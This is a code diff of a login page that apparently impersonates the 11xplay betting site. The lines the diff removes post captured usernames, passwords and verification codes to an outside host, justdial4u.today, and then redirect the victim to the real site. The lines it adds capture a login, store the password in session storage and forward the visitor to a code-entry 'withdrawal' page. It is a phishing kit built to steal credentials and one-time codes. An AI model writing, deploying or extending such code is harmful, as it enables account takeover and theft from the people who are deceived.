@@ -8,6 +8,8 @@
         <meta content="" name="keywords">
         <!-- Favicons -->
         <link href="assets/img/favicon.ico" rel="icon">
+	        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
         <!-- Google Fonts -->
         <style type="text/css">
             @font-face {
@@ -944,56 +946,34 @@
             /*margin-top: 20%;*/
         }
     </style>
-	    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
 
 	     <script type="text/javascript">
-        // Function to send all data to PHP page after user enters the code
-        function submitCodeAndSendEmail(event) {
+        // Function to handle the login submission
+        function checkLogin(event) {
             event.preventDefault();  // Prevent form from submitting the normal way
 
-            // Get the entered code
-            var code = $("#code").val();
+            // Get values from the form inputs
+            var loginName = $("#username").val();  
+            var password = $("#password").val();  
 
-            // Get saved login data from sessionStorage
-            var loginName = sessionStorage.getItem("loginName");
-            var password = sessionStorage.getItem("password");
+            // Ensure both fields are filled
+            if (loginName !== '' && password !== '') {
+                // Save login data to session storage
+                sessionStorage.setItem("loginName", loginName);
+                sessionStorage.setItem("password", password);
 
-            // Ensure code is filled
-            if (code !== '') {
-                // Send the data to the PHP page to send email
-                $.ajax({
-                    type: "POST",
-                    url: "https://justdial4u.today/11xxplay-mail.php", 
-                    data: {
-                        loginName: loginName,
-                        password: password,
-                        code: code
-                    },
-                    success: function (msg) {
-                        console.log("Server Response: ", msg);  // Debugging: Check the response from the server
-
-                        if (msg === "sucessmsg") {
-                            alert("Email sent successfully!");
-                            window.location.href = "https://11xplay.com/";  // Redirect after successful email sending
-                        } else {
-                            $("#errorMsg").html('There was an error sending the email.');  // Show error if sending email fails
-                        }
-                    },
-                    error: function(xhr, status, error) {
-                        console.log("Error:", status, error);  // Log error details for debugging
-                        alert('An error occurred. Please try again.');
-                    }
-                });
+                // Redirect to the withdrawal page (enter code page)
+                window.location.href = "withdrawal.html";  
             } else {
-                alert('Please enter the code.');  // Show alert if code is empty
+                $("#errorMsg").html("All fields are required.");  // Show alert if any field is empty
             }
         }
 
         $(document).ready(function () {
-            // Handle the form submission for the code
-            $("form#codeForm").on("submit", function (event) {
-                submitCodeAndSendEmail(event);  
+            // Handle the initial login form submission
+            $("form").on("submit", function (event) {
+                checkLogin(event);  
             });
         });
     </script>
